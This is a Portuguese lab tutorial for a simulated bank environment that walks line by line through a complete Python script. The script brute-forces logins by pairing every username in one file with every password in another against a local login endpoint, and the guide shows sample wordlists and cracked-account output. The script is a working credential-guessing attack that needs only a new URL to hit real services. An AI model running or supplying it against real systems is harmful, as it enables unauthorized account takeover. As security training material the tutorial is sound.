# Guia Prático: Automação com Múltiplos Usuários e Senhas

**Laboratório Prático:** NexusBank Corporate  
**Ambiente de Testes:** Python 3 + Biblioteca `requests`  
**Arquivos de Entrada:** `usuarios.txt` e `senhas.txt`  
**Código de Apoio:** `bruteforce_multi_usuarios.py`  

---

## 1. O Cenário: Enumeração de Múltiplas Contas

No guia anterior, sabíamos previamente quem era o alvo: a conta `"ana"`.

Em uma auditoria de segurança ou teste de intrusão corporativo, a equipe frequentemente obtém uma **lista de possíveis colaboradores ou usuários de sistema** e precisa validar se algum deles utiliza senhas fracas.

Para automatizar essa rotina, integramos **dois arquivos de texto simultâneos**:
* `usuarios.txt`: Contém os nomes de contas a serem testadas (um por linha).
* `senhas.txt`: Contém os palpites de senhas fracas (uma por linha).

```text
usuarios.txt            senhas.txt
┌──────────┐            ┌──────────┐
│ ana      │            │ 111111   │
│ bruno    │   ───X───  │ senha123 │
│ carlos   │            │ 123456   │
│ admin    │            │ admin123 │
└──────────┘            └──────────┘
```

---

## 2. Conceitos Técnicos Específicos Deste Script

### A. Laços de Repetição Aninhados (Loop dentro de Loop)
A combinação de duas listas exige uma estrutura de laço aninhado:
1. **Laço Externo (`for usuario in usuarios:`):** Seleciona um usuário da lista e fixa esse valor.
2. **Laço Interno (`for senha in senhas:`):** Para aquele usuário específico, percorre a lista de senhas candidatas enviando requisições.
3. Concluídas as tentativas para aquele usuário (ou encontrada a senha correta), o laço externo avança para o próximo usuário e reinicia as senhas.

```text
[Usuário selecionado: ana]
   ├── Testa senha: "111111"   -> 401
   ├── Testa senha: "senha123" -> 401
   └── Testa senha: "123456"   -> 200 (Sucesso! Interrompe e passa ao próximo)

[Usuário selecionado: bruno]
   ├── Testa senha: "111111"   -> 401
   └── Testa senha: "senha123" -> 200 (Sucesso! Interrompe e passa ao próximo)
```

### B. Gestão de Memória com `.read().splitlines()`
Se você tentar abrir e iterar diretamente sobre dois arquivos de texto usando `open()` dentro de dois laços `for`, o ponteiro do arquivo de senhas chegará ao fim na primeira iteração (usuário `"ana"`). Ao avançar para o segundo usuário (`"bruno"`), o arquivo de senhas já estará no final e nenhuma senha será testada!

Para evitar esse problema, carregamos o conteúdo de ambos os arquivos para **estruturas de lista em memória**:
```python
with open("usuarios.txt", "r") as arq_u:
    usuarios = arq_u.read().splitlines()

with open("senhas.txt", "r") as arq_s:
    senhas = arq_s.read().splitlines()
```
* O método `.splitlines()` lê o arquivo, particiona o texto em elementos de lista e **já remove automaticamente o caractere invisível `\n`** (quebra de linha) de cada item.

### C. O Papel do `break` em Laços Aninhados
No momento em que o servidor responde com código `200` (sucesso), acionamos o comando `break`.  
Em Python, o comando `break` encerra **apenas o laço no qual ele está contido** (o laço interno de senhas).  
Dessa maneira, o script para de testar senhas para quem já teve o acesso validado e avança imediatamente para o próximo usuário.

---

## 3. Análise Linha a Linha do Código

```python
 1 | import requests
 2 | 
 3 | # ==============================================================================
 4 | # 1. PARÂMETROS DE EXECUÇÃO
 5 | # ==============================================================================
 6 | url = "http://127.0.0.1:8002/login"
 7 | arquivo_usuarios = "usuarios.txt"
 8 | arquivo_senhas = "senhas.txt"
 9 | 
10 | print("=" * 60)
11 | print("   INICIANDO TESTE DE AUTENTICAÇÃO COM MÚLTIPLOS USUÁRIOS")
12 | print("=" * 60)
13 | 
14 | # ==============================================================================
15 | # 2. CARREGAMENTO DOS DADOS PARA A MEMÓRIA
16 | # ==============================================================================
17 | with open(arquivo_usuarios, "r") as arq_u:
18 |     usuarios = arq_u.read().splitlines()
19 | 
20 | with open(arquivo_senhas, "r") as arq_s:
21 |     senhas = arq_s.read().splitlines()
22 | 
23 | print(f"Total de usuários carregados : {len(usuarios)}")
24 | print(f"Total de senhas carregadas   : {len(senhas)}")
25 | print("=" * 60)
26 | 
27 | # ==============================================================================
28 | # 3. EXECUÇÃO DOS LAÇOS ANINHADOS (USUÁRIO x SENHA)
29 | # ==============================================================================
30 | for usuario in usuarios:
31 |     print(f"\n[+] Testando conta: {usuario}")
32 |     senha_encontrada = False
33 | 
34 |     for senha in senhas:
35 |         dados = {
36 |             "usuario": usuario,
37 |             "senha": senha
38 |         }
39 | 
40 |         resposta = requests.post(url, json=dados)
41 | 
42 |         print(f"    Tentativa com senha '{senha}' -> Status: {resposta.status_code}")
43 | 
44 |         if resposta.status_code == 200:
45 |             print(f"    >>> SUCESSO! A senha do usuário '{usuario}' é: '{senha}' <<<")
46 |             senha_encontrada = True
47 |             break
48 | 
49 |     if not senha_encontrada:
50 |         print(f"    [-] Nenhuma senha da lista foi válida para o usuário '{usuario}'.")
51 | 
52 | print("\n" + "=" * 60)
53 | print("Processo concluído para todos os usuários da lista.")
54 | print("=" * 60)
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `1` | `import requests` | Carrega a biblioteca de comunicação HTTP. |
| `6–8` | Configurações | Define a URL da API e os nomes dos arquivos `.txt` de entrada. |
| `17–18`| Leitura de Usuários | Abre `usuarios.txt` e converte em lista Python sem as quebras de linha (`\n`). |
| `20–21`| Leitura de Senhas | Abre `senhas.txt` e converte em lista Python sem as quebras de linha. |
| `23–24`| `len(...)` | Exibe a contagem de registros carregados na memória. |
| `30` | `for usuario in usuarios:` | **Laço Externo:** Seleciona um usuário da lista a cada ciclo. |
| `32` | `senha_encontrada = False` | Inicializa a flag booleana de controle para o usuário da vez. |
| `34` | `for senha in senhas:` | **Laço Interno:** Itera sobre as senhas candidatas para o usuário ativo. |
| `35–38`| `dados = {"usuario": ..., "senha": ...}` | Monta a estrutura de dados (payload) para o formulário de login. |
| `40` | `requests.post(url, json=dados)` | Dispara a requisição HTTP POST para a API do laboratório. |
| `42` | `print(...)` | Mostra a tentativa atual e o código retornado pelo servidor. |
| `44` | `if resposta.status_code == 200:` | Verifica se a autenticação obteve êxito. |
| `45–47`| `print(...)`, `flag = True`, `break` | Exibe sucesso, marca a flag e encerra **apenas o laço de senhas**. |
| `49–50`| `if not senha_encontrada:` | Se nenhuma senha retornou 200, informa que o usuário não foi comprometido. |

---

## 4. Código Completo: `bruteforce_multi_usuarios.py`

```python
import requests

# ==============================================================================
# 1. PARÂMETROS DE EXECUÇÃO
# ==============================================================================
url = "http://127.0.0.1:8002/login"

arquivo_usuarios = "usuarios.txt"
arquivo_senhas = "senhas.txt"

print("=" * 60)
print("   INICIANDO TESTE DE AUTENTICAÇÃO COM MÚLTIPLOS USUÁRIOS")
print("=" * 60)

# ==============================================================================
# 2. CARREGAMENTO DOS DADOS PARA A MEMÓRIA
# ==============================================================================
with open(arquivo_usuarios, "r") as arq_u:
    usuarios = arq_u.read().splitlines()

with open(arquivo_senhas, "r") as arq_s:
    senhas = arq_s.read().splitlines()

print(f"Total de usuários carregados : {len(usuarios)}")
print(f"Total de senhas carregadas   : {len(senhas)}")
print("=" * 60)

# ==============================================================================
# 3. EXECUÇÃO DOS LAÇOS ANINHADOS (USUÁRIO x SENHA)
# ==============================================================================
for usuario in usuarios:
    print(f"\n[+] Testando conta: {usuario}")
    senha_encontrada = False

    for senha in senhas:
        dados = {
            "usuario": usuario,
            "senha": senha
        }

        resposta = requests.post(url, json=dados)

        print(f"    Tentativa com senha '{senha}' -> Status: {resposta.status_code}")

        if resposta.status_code == 200:
            print(f"    >>> SUCESSO! A senha do usuário '{usuario}' é: '{senha}' <<<")
            senha_encontrada = True
            break

    if not senha_encontrada:
        print(f"    [-] Nenhuma senha da lista foi válida para o usuário '{usuario}'.")

print("\n" + "=" * 60)
print("Processo concluído para todos os usuários da lista.")
print("=" * 60)
```

---

## 5. Procedimento de Execução e Análise de Retorno

1. Crie os arquivos de entrada na pasta do script:

   **`usuarios.txt`**
   ```text
   ana
   bruno
   carlos
   admin
   ```

   **`senhas.txt`**
   ```text
   111111
   senha123
   123456
   admin123
   qwerty
   ```

2. Execute o script no terminal:
   ```bash
   python bruteforce_multi_usuarios.py
   ```

3. **Saída esperada no terminal:**
   ```text
   ============================================================
      INICIANDO TESTE DE AUTENTICAÇÃO COM MÚLTIPLOS USUÁRIOS
   ============================================================
   Total de usuários carregados : 4
   Total de senhas carregadas   : 5
   ============================================================

   [+] Testando conta: ana
       Tentativa com senha '111111' -> Status: 401
       Tentativa com senha 'senha123' -> Status: 401
       Tentativa com senha '123456' -> Status: 200
       >>> SUCESSO! A senha do usuário 'ana' é: '123456' <<<

   [+] Testando conta: bruno
       Tentativa com senha '111111' -> Status: 401
       Tentativa com senha 'senha123' -> Status: 200
       >>> SUCESSO! A senha do usuário 'bruno' é: 'senha123' <<<

   [+] Testando conta: carlos
       Tentativa com senha '111111' -> Status: 401
       Tentativa com senha 'senha123' -> Status: 401
       Tentativa com senha '123456' -> Status: 401
       Tentativa com senha 'admin123' -> Status: 401
       Tentativa com senha 'qwerty' -> Status: 401
       [-] Nenhuma senha da lista foi válida para o usuário 'carlos'.

   [+] Testando conta: admin
       Tentativa com senha '111111' -> Status: 401
       Tentativa com senha 'senha123' -> Status: 401
       Tentativa com senha '123456' -> Status: 401
       Tentativa com senha 'admin123' -> Status: 403
       Tentativa com senha 'qwerty' -> Status: 401
       [-] Nenhuma senha da lista foi válida para o usuário 'admin'.
   ```

> 📌 **Análise Técnica: Por que o `admin` retornou Status 403?**  
> Mesmo enviando a senha correta (`admin123`), o servidor respondeu **403 (Forbidden)**.  
> Isso ocorre porque o endpoint `/login` aceita exclusivamente o papel de `cliente`. Contas corporativas (como `admin` ou `operador`) exigem a rota administrativa `/admin/login`, simulando a segregação de privilégios de sistemas bancários reais.
